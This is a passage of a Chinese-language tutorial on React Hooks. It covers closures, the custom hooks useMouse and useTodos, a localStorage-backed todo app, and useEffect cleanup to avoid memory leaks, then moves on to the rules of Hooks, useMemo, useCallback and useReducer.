    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，今年<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>)
  }
}
</code></pre>
<h3 data-id="heading-33">8️⃣ 闭包</h3>
<p>函数能够记住并访问其词法作用域，即使函数在其词法作用域之外执行。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> {
      count++
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count)
    },
    <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> {
      count--
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count)
    }
  }
}

<span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">createCounter</span>()
counter.<span class="hljs-title function_">increment</span>() <span class="hljs-comment">// 1</span>
counter.<span class="hljs-title function_">increment</span>() <span class="hljs-comment">// 2</span>
counter.<span class="hljs-title function_">decrement</span>() <span class="hljs-comment">// 1</span>
</code></pre>
<p>闭包的应用场景：</p>
<ul>
<li>数据私有化</li>
<li>柯里化</li>
<li>模块模式</li>
<li>事件处理程序</li>
</ul>
<p>在 React Hooks 中的闭包问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count) <span class="hljs-comment">// 永远打印 0，因为闭包捕获了初始值</span>
    }, <span class="hljs-number">1000</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer)
  }, []) <span class="hljs-comment">// 空依赖数组</span>
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;{count}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
}
</code></pre>
<p>解决方案：使用函数式更新或添加正确的依赖。</p>
<h2 data-id="heading-34">🚀 四、自定义 Hooks</h2>
<p>自定义 Hooks 是一个函数，其名称以 <code>use</code> 开头，函数内部可以调用其他 Hooks。</p>
<h3 data-id="heading-35">🎯 自定义 Hooks 的优势</h3>
<ol>
<li><strong>逻辑复用</strong>：将组件间的共享逻辑抽离到自定义 Hook 中</li>
<li><strong>关注点分离</strong>：UI 组件更简单，只负责 HTML + CSS，好维护</li>
<li><strong>复用性好</strong>：和组件一样，是前端团队的核心资产</li>
<li><strong>业务逻辑更简单</strong>：好测试</li>
</ol>
<h3 data-id="heading-36">📦 案例 1：useMouse Hook</h3>
<p>监听鼠标位置的自定义 Hook。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useMouse</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [x, setX] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> [y, setY] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">update</span> = (<span class="hljs-params">event</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'鼠标移动'</span>)
      <span class="hljs-title function_">setX</span>(event.<span class="hljs-property">pageX</span>)
      <span class="hljs-title function_">setY</span>(event.<span class="hljs-property">pageY</span>)
    }
    
    <span class="hljs-comment">// 组件挂载时，监听 mousemove 事件</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'事件监听已添加'</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 组件卸载时，移除 mousemove 事件</span>
      <span class="hljs-comment">// 防止内存泄漏</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'清除事件监听'</span>)
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
    }
  }, [])

  <span class="hljs-keyword">return</span> { x, y }
}
</code></pre>
<p>使用方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> useMouse <span class="hljs-keyword">from</span> <span class="hljs-string">'./hooks/useMouse'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { x, y } = <span class="hljs-title function_">useMouse</span>()
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      鼠标位置：{x} {y}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-37">📦 案例 2：useTodos Hook</h3>
<p>完整的待办事项管理 Hook。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STORAGE_KEY</span> = <span class="hljs-string">'todos'</span>

<span class="hljs-comment">// 从 localStorage 加载 todos</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadFromStorage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> storedTodos = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">STORAGE_KEY</span>)
  <span class="hljs-keyword">return</span> storedTodos ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(storedTodos) : []
}

<span class="hljs-comment">// 保存 todos 到 localStorage</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">saveToStorage</span>(<span class="hljs-params">todos</span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">STORAGE_KEY</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(todos))
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useTodos</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// useState 接收函数计算同步</span>
  <span class="hljs-keyword">const</span> [todos, setTodos] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">loadFromStorage</span>())

  <span class="hljs-comment">// 监听 todos 变化，保存到 localStorage</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">saveToStorage</span>(todos)
  }, [todos])
  
  <span class="hljs-comment">// 添加 todo</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addTodo</span> = (<span class="hljs-params">text</span>) =&gt; {
    text = text.<span class="hljs-title function_">trim</span>()
    <span class="hljs-keyword">if</span> (text === <span class="hljs-string">''</span>) {
      <span class="hljs-keyword">return</span>
    }
    <span class="hljs-title function_">setTodos</span>([
      ...todos,
      {
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">text</span>: text,
        <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>
      }
    ])
  }
  
  <span class="hljs-comment">// 删除 todo</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">deleteTodo</span> = (<span class="hljs-params">id</span>) =&gt; {
    <span class="hljs-title function_">setTodos</span>(todos.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> todo.<span class="hljs-property">id</span> !== id))
  }
  
  <span class="hljs-comment">// 切换 todo 完成状态</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTodo</span> = (<span class="hljs-params">id</span>) =&gt; {
    <span class="hljs-title function_">setTodos</span>(
      todos.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (todo.<span class="hljs-property">id</span> === id) {
          <span class="hljs-keyword">return</span> {
            ...todo,
            <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span>
          }
        }
        <span class="hljs-keyword">return</span> todo
      })
    )
  }

  <span class="hljs-keyword">return</span> {
    todos,
    addTodo,
    deleteTodo,
    toggleTodo
  }
}
</code></pre>
<h3 data-id="heading-38">🎨 组件实现</h3>
<h4 data-id="heading-39">TodoInput 组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoInput</span>(<span class="hljs-params">{ onAddTodo }</span>) {
  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>()
    <span class="hljs-keyword">if</span> (!text.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span>
    <span class="hljs-title function_">onAddTodo</span>(text.<span class="hljs-title function_">trim</span>())
    <span class="hljs-title function_">setText</span>(<span class="hljs-string">''</span>)
  }
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"todo-input"</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>
        <span class="hljs-attr">value</span>=<span class="hljs-string">{text}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setText(e.target.value)}
      /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>添加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-40">TodoItem 组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoItem</span>(<span class="hljs-params">{ todo, onDeleteTodo, onToggleTodo }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">className</span>=<span class="hljs-string">'todo-item'</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span>
        <span class="hljs-attr">checked</span>=<span class="hljs-string">{todo.completed}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{()</span> =&gt;</span> onToggleTodo(todo.id)}
      /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{todo.completed</span> ? '<span class="hljs-attr">completed</span>' <span class="hljs-attr">:</span> ''}&gt;</span>
        {todo.text}
      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> onDeleteTodo(todo.id)}&gt;删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-41">TodoList 组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">TodoItem</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./TodoItem.jsx'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params">{ todos, onDeleteTodo, onToggleTodo }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">className</span>=<span class="hljs-string">'todo-list'</span>&gt;</span>
      {todos.map((todo) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> 
          <span class="hljs-attr">key</span>=<span class="hljs-string">{todo.id}</span>
          <span class="hljs-attr">todo</span>=<span class="hljs-string">{todo}</span>
          <span class="hljs-attr">onDeleteTodo</span>=<span class="hljs-string">{onDeleteTodo}</span>
          <span class="hljs-attr">onToggleTodo</span>=<span class="hljs-string">{onToggleTodo}</span>
        /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-42">App 主组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> useTodos <span class="hljs-keyword">from</span> <span class="hljs-string">'./hooks/useTodos.js'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">TodoList</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/TodoList.jsx'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">TodoInput</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/TodoInput.jsx'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> {
    todos,
    addTodo,
    deleteTodo,
    toggleTodo,
  } = <span class="hljs-title function_">useTodos</span>()

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">TodoInput</span> <span class="hljs-attr">onAddTodo</span>=<span class="hljs-string">{addTodo}</span> /&gt;</span>
      {todos.length &gt; 0 ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">TodoList</span>
          <span class="hljs-attr">todos</span>=<span class="hljs-string">{todos}</span>
          <span class="hljs-attr">onDeleteTodo</span>=<span class="hljs-string">{deleteTodo}</span>
          <span class="hljs-attr">onToggleTodo</span>=<span class="hljs-string">{toggleTodo}</span>
        /&gt;</span>
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>暂无待办事项<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}
</code></pre>
<h2 data-id="heading-43">⚠️ 五、内存泄漏与清理</h2>
<h3 data-id="heading-44">🔍 什么是内存泄漏</h3>
<p>内存泄漏是指程序中已动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。</p>
<h3 data-id="heading-45">🐌 在 React 中的常见场景</h3>
<ol>
<li><strong>未清除的事件监听器</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
  <span class="hljs-comment">// 缺少清理函数</span>
}, [])
</code></pre>
<ol start="2">
<li><strong>未清除的定时器</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'定时器'</span>)
  }, <span class="hljs-number">1000</span>)
  <span class="hljs-comment">// 缺少清理函数</span>
}, [])
</code></pre>
<ol start="3">
<li><strong>未取消的网络请求</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/data'</span>)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setData</span>(data))
  <span class="hljs-comment">// 组件卸载后，请求可能仍在进行</span>
}, [])
</code></pre>
<h3 data-id="heading-46">✅ 正确的清理方式</h3>
<h4 data-id="heading-47">事件监听器清理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">update</span> = (<span class="hljs-params">event</span>) =&gt; {
    <span class="hljs-title function_">setX</span>(event.<span class="hljs-property">pageX</span>)
    <span class="hljs-title function_">setY</span>(event.<span class="hljs-property">pageY</span>)
  }
  
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
  }
}, [])
</code></pre>
<h4 data-id="heading-48">定时器清理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'定时器运行'</span>)
  }, <span class="hljs-number">1000</span>)
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-built_in">clearInterval</span>(timer)
  }
}, [])
</code></pre>
<h4 data-id="heading-49">网络请求清理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/data'</span>, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setData</span>(data))
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)
      }
    })
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    controller.<span class="hljs-title function_">abort</span>()
  }
}, [])
</code></pre>
<h3 data-id="heading-50">🎯 useEffect 清理函数执行时机</h3>
<p>清理函数在以下时机执行：</p>
<ol>
<li><strong>组件卸载时</strong>：组件从 DOM 中移除时</li>
<li><strong>下一次副作用执行前</strong>：当依赖数组变化，新的副作用执行前</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'副作用执行'</span>)
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'清理函数执行'</span>)
  }
}, [count])
</code></pre>
<p>执行顺序：</p>
<ul>
<li>组件挂载：副作用执行</li>
<li>count 变化：清理函数执行 → 副作用执行</li>
<li>组件卸载：清理函数执行</li>
</ul>
<h2 data-id="heading-51">🎓 六、Hooks 使用规则</h2>
<h3 data-id="heading-52">📏 两条黄金规则</h3>
<ol>
<li><strong>只在函数最顶层调用 Hooks</strong>
<ul>
<li>不要在循环、条件判断或嵌套函数中调用 Hooks</li>
<li>确保 Hooks 在每次渲染时都以相同的顺序被调用</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 错误示例</span>
<span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ...</span>
  }, [])
}

<span class="hljs-comment">// ✅ 正确示例</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// ...</span>
  }
}, [count])
</code></pre>
<ol start="2">
<li><strong>只在 React 函数中调用 Hooks</strong>
<ul>
<li>在 React 函数组件中调用 Hooks</li>
<li>在自定义 Hooks 中调用 Hooks</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 错误示例</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">regularFunction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
}

<span class="hljs-comment">// ✅ 正确示例</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
}
</code></pre>
<h3 data-id="heading-53">🔧 ESLint 插件</h3>
<p>使用 <code>eslint-plugin-react-hooks</code> 来强制执行这些规则：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"plugins"</span>: [
    <span class="hljs-string">"react-hooks"</span>
  ],
  <span class="hljs-string">"rules"</span>: {
    <span class="hljs-string">"react-hooks/rules-of-hooks"</span>: <span class="hljs-string">"error"</span>,
    <span class="hljs-string">"react-hooks/exhaustive-deps"</span>: <span class="hljs-string">"warn"</span>
  }
}
</code></pre>
<h2 data-id="heading-54">📊 七、常用内置 Hooks 补充</h2>
<h3 data-id="heading-55">useMemo Hook</h3>
<p>用于缓存计算结果，避免不必要的重复计算。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ExpensiveComponent</span>(<span class="hljs-params">{ items }</span>) {
  <span class="hljs-keyword">const</span> sortedItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'计算排序'</span>)
    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a.<span class="hljs-property">value</span> - b.<span class="hljs-property">value</span>)
  }, [items])
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{sortedItems.map(...)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}
</code></pre>
<h3 data-id="heading-56">useCallback Hook</h3>
<p>用于缓存函数，避免子组件不必要的重新渲染。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useCallback } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击'</span>)
  }, [])
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleClick}</span> /&gt;</span></span>
}
</code></pre>
<h3 data-id="heading-57">useReducer Hook</h3>
<p>用于复杂的状态管理，类似 Redux。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useReducer } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state, action</span>) {
  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'increment'</span>:
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> }
    <span class="hljs-keyword">case</span> <span class="hljs-string">'decrement'</span>:
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> }
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> state
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> })
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{state.count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> dispatch({ type: 'increment' })}&gt;增加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> dispatch({ type: 'decrement' })}&gt;减少<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h2 data-id="heading-58">🎯 八、项目实战总结</h2>
<h3 data-id="heading-59">📁 项目结构</h3>
<pre><code class="hljs language-css" lang="css">hooks-demo/
├── <span class="hljs-attribute">src</span>/
│   ├── components/
│   │   ├── TodoInput<span class="hljs-selector-class">.jsx</span>
│   │   ├── TodoItem<span class="hljs-selector-class">.jsx</span>
│   │   └── TodoList<span class="hljs-selector-class">.jsx</span>
│   ├── hooks/
│   │   ├── useMouse<span class="hljs-selector-class">.js</span>
│   │   └── useTodos<span class="hljs-selector-class">.js</span>
│   ├── App<span class="hljs-selector-class">.jsx</span>
│   ├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.jsx</span>
│   └── index<span class="hljs-selector-class">.css</span>
└── package<span class="hljs-selector-class">.json</span>
</code></pre>
<h3 data-id="heading-60">🔄 数据流</h3>
<pre><code class="hljs language-scss" lang="scss">App (使用 useTodos)
  ├── TodoInput (接收 onAddTodo)
  └── TodoList (接收 todos, onDeleteTodo, onToggleTodo)
      └── TodoItem (接收 todo, onDeleteTodo, onToggleTodo)
</code></pre>
<h3 data-id="heading-61">💡 核心要点</h3>
<ol>
<li><strong>自定义 Hooks 封装业务逻辑</strong>，使组件更简洁</li>
<li><strong>useEffect 的清理函数</strong>防止内存泄漏</li>
<li><strong>useState 的惰性初始化</strong>提高性能</li>
<li><strong>localStorage 持久化</strong>数据</li>
<li><strong>组件化开发</strong>，关注点分离</li>
</ol>
<h2 data-id="heading-62">🚀 九、最佳实践</h2>
<h3 data-id="heading-63">✨ 命名规范</h3>
<ul>
<li>自定义 Hooks 必须以 <code>use</code> 开头</li>
<li>组件名使用 PascalCase</li>
<li>函数名使用 camelCase</li>
</ul>
